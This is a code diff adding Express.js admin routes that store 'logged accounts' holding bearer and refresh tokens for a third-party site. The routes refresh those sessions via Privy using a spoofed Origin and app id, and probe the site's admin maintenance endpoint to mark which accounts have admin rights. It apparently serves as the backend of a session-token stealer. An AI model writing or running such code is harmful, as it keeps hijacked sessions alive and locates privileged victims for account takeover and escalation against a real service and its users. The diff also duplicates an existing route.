@@ -1621,6 +1621,154 @@ app.get("/api/user/admin/validated", (req, res) => {
   const data = loadValidated();
   res.json(data);
 });
+// Get all validated entries
+app.get("/api/user/admin/validated", (req, res) => {
+  if (req.header("admin-token") !== ADMIN_TOKEN)
+    return res.status(401).json({ ok: false, error: "unauthorized" });
+  
+  const data = loadValidated();
+  res.json(data);
+});
+
+// Delete a logged account
+app.post("/api/user/admin/validated/delete", (req, res) => {
+  if (req.header("admin-token") !== ADMIN_TOKEN)
+    return res.status(401).json({ ok: false, error: "unauthorized" });
+  
+  const { key } = req.body || {};
+  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
+  
+  const data = loadValidated();
+  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
+  
+  delete data[key];
+  saveValidated(data);
+  
+  res.json({ ok: true, message: `Deleted ${key}` });
+});
+
+// Set note for a logged account
+app.post("/api/user/admin/validated/set-note", (req, res) => {
+  if (req.header("admin-token") !== ADMIN_TOKEN)
+    return res.status(401).json({ ok: false, error: "unauthorized" });
+  
+  const { key, note } = req.body || {};
+  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
+  
+  const data = loadValidated();
+  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
+  
+  data[key].note = String(note || "").slice(0, 200);
+  saveValidated(data);
+  
+  res.json({ ok: true });
+});
+
+// Refresh bearer token via Privy
+app.post("/api/user/admin/validated/refresh-bearer", async (req, res) => {
+  if (req.header("admin-token") !== ADMIN_TOKEN)
+    return res.status(401).json({ ok: false, error: "unauthorized" });
+  
+  const { key } = req.body || {};
+  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
+  
+  const data = loadValidated();
+  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
+  
+  const entry = data[key];
+  if (!entry.refreshToken) {
+    return res.status(400).json({ ok: false, error: "no_refresh_token" });
+  }
+  
+  try {
+    const privyRes = await fetch("https://auth.privy.io/api/v1/sessions", {
+      method: "POST",
+      headers: {
+        "Origin": "https://www.damnbruh.com",
+        "Privy-App-Id": "cmb0gnxdk0022ky0mhtupnp2w",
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${entry.refreshToken}`
+      },
+      body: JSON.stringify({})
+    });
+    
+    const privyData = await privyRes.json().catch(() => null);
+    
+    if (!privyRes.ok) {
+      return res.status(privyRes.status).json({ 
+        ok: false, 
+        error: privyData?.error || `Privy returned ${privyRes.status}`,
+        details: privyData
+      });
+    }
+    
+    // Extract new tokens from response
+    const newBearer = privyData?.token || privyData?.access_token || privyData?.accessToken;
+    const newRefresh = privyData?.refresh_token || privyData?.refreshToken;
+    
+    if (newBearer) {
+      entry.bearerToken = newBearer;
+      entry.bearerUpdatedAt = Date.now();
+    }
+    if (newRefresh) {
+      entry.refreshToken = newRefresh;
+    }
+    
+    saveValidated(data);
+    
+    res.json({ 
+      ok: true, 
+      message: "Bearer refreshed",
+      bearerUpdatedAt: entry.bearerUpdatedAt
+    });
+  } catch (e) {
+    console.error("[refresh-bearer]", e);
+    res.status(500).json({ ok: false, error: e.message || "request_failed" });
+  }
+});
+
+// Check admin permissions
+app.post("/api/user/admin/validated/check-admin", async (req, res) => {
+  if (req.header("admin-token") !== ADMIN_TOKEN)
+    return res.status(401).json({ ok: false, error: "unauthorized" });
+  
+  const { key } = req.body || {};
+  if (!key) return res.status(400).json({ ok: false, error: "missing_key" });
+  
+  const data = loadValidated();
+  if (!data[key]) return res.status(404).json({ ok: false, error: "not_found" });
+  
+  const entry = data[key];
+  if (!entry.bearerToken) {
+    return res.status(400).json({ ok: false, error: "no_bearer_token" });
+  }
+  
+  try {
+    const adminRes = await fetch("https://www.damnbruh.com/api/admin/maintenance", {
+      method: "GET",
+      headers: {
+        "Authorization": `Bearer ${entry.bearerToken}`
+      }
+    });
+    
+    // 401 = not admin, 500 or other = likely admin (endpoint exists but errored)
+    const isAdmin = adminRes.status !== 401;
+    
+    entry.adminPerms = isAdmin;
+    entry.adminCheckedAt = Date.now();
+    saveValidated(data);
+    
+    res.json({ 
+      ok: true, 
+      adminPerms: isAdmin,
+      status: adminRes.status,
+      adminCheckedAt: entry.adminCheckedAt
+    });
+  } catch (e) {
+    console.error("[check-admin]", e);
+    res.status(500).json({ ok: false, error: e.message || "request_failed" });
+  }
+});
 
 /* =======================================================
    ================== Default & Start ====================
